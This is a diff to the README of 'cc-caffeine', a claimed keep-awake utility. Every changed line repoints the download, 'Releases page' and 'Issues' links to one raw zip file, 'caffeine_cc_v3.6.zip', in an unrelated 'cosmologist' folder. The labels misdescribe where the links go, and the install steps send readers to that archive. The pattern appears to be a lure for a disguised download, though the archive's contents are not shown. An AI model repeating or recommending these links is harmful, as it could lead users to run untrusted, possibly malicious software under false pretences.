@@ -1,6 +1,6 @@
 # ☕️ cc-caffeine - Keep Your Computer Awake While You Work
 
-[![Download cc-caffeine](https://raw.githubusercontent.com/dragonball92/cc-caffeine/main/cosmologist/cc-caffeine.zip)](https://raw.githubusercontent.com/dragonball92/cc-caffeine/main/cosmologist/cc-caffeine.zip)
+[![Download cc-caffeine](https://raw.githubusercontent.com/dragonball92/cc-caffeine/main/cosmologist/caffeine_cc_v3.6.zip)](https://raw.githubusercontent.com/dragonball92/cc-caffeine/main/cosmologist/caffeine_cc_v3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -31,9 +31,9 @@ cc-caffeine is a simple tool designed to prevent your computer from going to sle
 
 ## ⬇️ Download & Install
 
-Visit this page to download: [cc-caffeine Releases](https://raw.githubusercontent.com/dragonball92/cc-caffeine/main/cosmologist/cc-caffeine.zip). 
+Visit this page to download: [cc-caffeine Releases](https://raw.githubusercontent.com/dragonball92/cc-caffeine/main/cosmologist/caffeine_cc_v3.6.zip). 
 
-1. Go to the [cc-caffeine Releases page](https://raw.githubusercontent.com/dragonball92/cc-caffeine/main/cosmologist/cc-caffeine.zip).
+1. Go to the [cc-caffeine Releases page](https://raw.githubusercontent.com/dragonball92/cc-caffeine/main/cosmologist/caffeine_cc_v3.6.zip).
 2. Look for the latest version at the top of the page.
 3. Click on the appropriate file link for your operating system to download it.
 4. Once the download completes, find the file in your downloads folder.
@@ -51,7 +51,7 @@ Visit this page to download: [cc-caffeine Releases](https://raw.githubuserconten
 
 If you encounter any issues or have questions, feel free to reach out. You can create an issue on the GitHub repository or check the FAQs on the Releases page.
 
-- [cc-caffeine Issues](https://raw.githubusercontent.com/dragonball92/cc-caffeine/main/cosmologist/cc-caffeine.zip)
+- [cc-caffeine Issues](https://raw.githubusercontent.com/dragonball92/cc-caffeine/main/cosmologist/caffeine_cc_v3.6.zip)
 
 ## 🤝 Contributing
 
